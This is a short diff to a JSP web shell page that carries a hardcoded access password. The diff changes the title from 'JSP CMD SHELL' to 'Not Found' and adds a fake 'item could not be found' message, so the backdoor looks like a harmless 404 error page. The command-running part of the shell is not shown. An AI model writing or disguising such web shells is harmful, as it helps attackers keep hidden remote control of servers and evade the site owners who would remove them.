@@ -3,12 +3,13 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>JSP CMD SHELL</title>
+    <title>Not Found</title>
     <style>
       input{border:1px solid #ccc;height:25px;}.icmd{padding:2px 5px;width:50%;}.isb{height:30px;cursor:pointer;}.isb:hover{background-color:#2f2f2f;color:#fff;}.checkbox-wrap{display:inline;margin:0 auto;background-color:white;}input[type="checkbox"]{display:none;}input[type="checkbox"]+label{display:inline-block;margin-top:10px;margin-left:5px;text-align:left;-webkit-box-sizing:border-box;}label::before{content:"";display:inline-block;width:30px;height:30px;background:#EEE;vertical-align:middle;-webkit-border-radius:50%;margin-right:5px;-webkit-box-sizing:border-box;-webkit-transition:background ease-in .5s}input[type="checkbox"]:checked+label::before{background-color:rgb(53,183,111);border:5px #EEEEEE solid;}
     </style>
 </head>
 <body>
+<p>Sorry, the item you are looking for could not be found.</p>
 <%
 String ipw = request.getParameter("p");
 String pw = "V9jziYDPk4GGptKL";
